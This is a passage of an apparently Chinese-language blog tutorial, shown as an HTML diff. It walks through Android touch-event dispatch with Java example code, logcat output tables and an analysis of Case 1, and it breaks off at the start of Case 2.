+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">接着实现 Activity 的代码，因为控件所有的事件都是通过 Activity 的 dispatchTouchEvent 进行分发的；除此之外还需要重写 Activity 的 onTouchEvent 方法，这是因为如果一个控件直接从 Activity 获取到事件，这个事件会首先被传递到控件的 dispatchTouchEvent 方法，如果这个方法 <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"> <span style="color: #993366;"><strong>return </strong></span></span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="color: #993366;">false</span></strong><span style="color: #000000;">，事件会以<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #ff6600;">冒泡方式<span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #000000;">返回给 Activity 的 onTouchEvent 进行消费。<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">实现代码如下：</span></span></span></span></span></span><br /></span></p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">package</span><span style="color: #000000;"> cn.sunzn.tevent;
+
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.app.Activity;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.os.Bundle;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.util.Log;
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.view.MotionEvent;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span> TouchEventActivity <span style="color: #0000ff;">extends</span><span style="color: #000000;"> Activity {
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">void</span><span style="color: #000000;"> onCreate(Bundle savedInstanceState) {
+        </span><span style="color: #0000ff;">super</span><span style="color: #000000;">.onCreate(savedInstanceState);
+        setContentView(R.layout.main);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> dispatchTouchEvent(MotionEvent ev) {
+        Log.w(</span>"sunzn", "TouchEventActivity | dispatchTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(ev.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.dispatchTouchEvent(ev);
+    }
+
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">boolean</span><span style="color: #000000;"> onTouchEvent(MotionEvent event) {
+        Log.w(</span>"sunzn", "TouchEventActivity | onTouchEvent --&gt; " +<span style="color: #000000;"> TouchEventUtil.getTouchAction(event.getAction()));
+        </span><span style="color: #0000ff;">return</span> <span style="color: #0000ff;">super</span><span style="color: #000000;">.onTouchEvent(event);
+    }
+
+}</span></pre>
+</div>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">最后再附上 TouchEventUtil 的代码，TouchEventUtil 中并没有做多少事情，只是将以上 2 个自定义控件中各个方法的 MotionEvent 集中到一个工具类中并将其对应的动作以 String 形式返回，这样处理更便于实时观察控件的事件。代码如下：</span></p>
+<div class="cnblogs_code">
+<pre><span style="color: #0000ff;">package</span><span style="color: #000000;"> cn.sunzn.tevent;
+
+</span><span style="color: #0000ff;">import</span><span style="color: #000000;"> android.view.MotionEvent;
+
+</span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">class</span><span style="color: #000000;"> TouchEventUtil {
+    
+    </span><span style="color: #0000ff;">public</span> <span style="color: #0000ff;">static</span> String getTouchAction(<span style="color: #0000ff;">int</span><span style="color: #000000;"> actionId) {
+        String actionName </span>= "Unknow:id=" +<span style="color: #000000;"> actionId;
+        </span><span style="color: #0000ff;">switch</span><span style="color: #000000;"> (actionId) {
+        </span><span style="color: #0000ff;">case</span><span style="color: #000000;"> MotionEvent.ACTION_DOWN:
+            actionName </span>= "ACTION_DOWN"<span style="color: #000000;">;
+            </span><span style="color: #0000ff;">break</span><span style="color: #000000;">;
+        </span><span style="color: #0000ff;">case</span><span style="color: #000000;"> MotionEvent.ACTION_MOVE:
+            actionName </span>= "ACTION_MOVE"<span style="color: #000000;">;
+            </span><span style="color: #0000ff;">break</span><span style="color: #000000;">;
+        </span><span style="color: #0000ff;">case</span><span style="color: #000000;"> MotionEvent.ACTION_UP:
+            actionName </span>= "ACTION_UP"<span style="color: #000000;">;
+            </span><span style="color: #0000ff;">break</span><span style="color: #000000;">;
+        </span><span style="color: #0000ff;">case</span><span style="color: #000000;"> MotionEvent.ACTION_CANCEL:
+            actionName </span>= "ACTION_CANCEL"<span style="color: #000000;">;
+            </span><span style="color: #0000ff;">break</span><span style="color: #000000;">;
+        </span><span style="color: #0000ff;">case</span><span style="color: #000000;"> MotionEvent.ACTION_OUTSIDE:
+            actionName </span>= "ACTION_OUTSIDE"<span style="color: #000000;">;
+            </span><span style="color: #0000ff;">break</span><span style="color: #000000;">;
+        }
+        </span><span style="color: #0000ff;">return</span><span style="color: #000000;"> actionName;
+    }
+    
+}</span></pre>
+</div>
+<p><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-size: 15px;"><strong><span style="font-family: arial,helvetica,sans-serif;">三、<span style="font-family: arial,helvetica,sans-serif;">Touch 案例分析</span></span></strong></span></span></p>
+<p><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;Case 1 <br /></span></strong></p>
+<table style="border: 0px solid #79787d; width: 980px; height: 447px; background-color: #e4e5e6;" border="0">
+<tbody>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">拦截条件</span></strong></span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">控件名称 </span></strong></td>
+<td style="text-align: center;" colspan="3"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;" colspan="4"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onTouchEvent 返回值</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity</span></span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev) </span></span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">--- </span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">false </span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onInterceptTouchEvent(ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev)</span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onInterceptTouchEvent(ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">运行结果</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Level</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Time</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">PID</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Application</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Tag</span></span></span></span></span></span></td>
+<td style="text-align: center;" colspan="5">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Text</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #ff9900;">&nbsp;</span><span style="color: #ff9900;">05-10 03:41:19.743</span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;414 </span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;"><span style="color: #ff9900;">cn.sunzn.tevent </span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;">sunzn</span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #ff9900;">&nbsp; </span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">TouchEventActivity | dispatchTouchEvent --&gt; ACTION_DOWN</span><span style="color: #ff9900;"><br /></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">&nbsp;E</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;"><span style="color: #ff0000;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff0000; font-family: arial,helvetica,sans-serif;"><span style="color: #ff0000;"><span style="color: #ff0000;"><span style="color: #ff0000;">sunzn</span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #ff0000;"><span style="color: #ff0000;">&nbsp; <span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff0000;">TouchEventFather | dispatchTouchEvent --&gt; ACTION_DOWN</span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity | onTouchEvent --&gt; ACTION_DOWN</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity | dispatchTouchEvent --&gt; ACTION_MOVE</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; font-family: arial,helvetica,sans-serif; color: #ff9900;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp; <span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity | onTouchEvent --&gt; ACTION_MOVE</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">W</span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;cn.sunzn.tevent</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">sunzn</span></td>
+<td style="text-align: left;" colspan="5"><span style="color: #ff9900; font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;&nbsp;<span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity | dispatchTouchEvent --&gt; ACTION_UP</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">&nbsp;W</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;05-10 03:41:19.743</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;">&nbsp;414</span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;"><span style="color: #ff9900;">&nbsp;cn.sunzn.tevent</span></span></td>
+<td style="text-align: center;"><span style="font-size: 13px; color: #ff9900; font-family: arial,helvetica,sans-serif;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;">sunzn</span></span></span></span></span></span></span></span></td>
+<td style="text-align: left;" colspan="5"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;"><span style="color: #ff9900;">&nbsp; <span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #ff9900;">TouchEventActivity | onTouchEvent --&gt; ACTION_UP</span></span></span></span></span></span></span></span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px; color: #000000;">结果分析</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">代码运行后，事件首先由 TouchEventActivity 的 dispatchTouchEvent 方法分发给 TouchEventFather 控件的</span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent，而该控件的 dispatchTouchEvent 返回 false，表示对获取到的事件停止向下传递，同</span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">时也不对该事件进行消费。由于 TouchEventFather 获取的事件直接来自 TouchEventActivity ，则会将事件</span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">返回给 TouchEventActivity&nbsp; 的 onTouchEvent 进行消费，最后直接由 TouchEventActivity 来响应手指移动</span><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">和抬起事件。</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tbody>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</table>
+<p>&nbsp;<strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">&nbsp;Case 2 </span></strong></p>
+<table style="border: 0px solid #79787d; width: 980px; height: 447px; background-color: #e4e5e6;" border="0">
+<tbody>
+<tr>
+<td style="text-align: center;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">拦截条件</span></strong></span></strong></span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">控件名称 </span></strong></td>
+<td style="text-align: center;" colspan="3"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">dispatchTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;" colspan="4"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onInterceptTouchEvent 返回值</span></strong></td>
+<td style="text-align: center;"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">onTouchEvent 返回值</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventActivity</span></span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev) </span></span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">--- </span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventFather</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">true </span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onInterceptTouchEvent(ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;" colspan="2"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">TouchEventChilds</span></td>
+<td style="text-align: center;" colspan="3"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.dispatchTouchEvent(ev)</span></td>
+<td style="text-align: center;" colspan="4"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onInterceptTouchEvent(ev)</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">super.onTouchEvent(ev)</span></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: left;" colspan="10"><strong><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">运行结果</span></strong></td>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</tr>
+<tr>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Level</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Time</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">PID</span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Application</span></span></td>
+<td style="text-align: center;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;"><span style="font-family: arial,helvetica,sans-serif; font-size: 13px;">Tag</span></span></span></span></span></span></td>
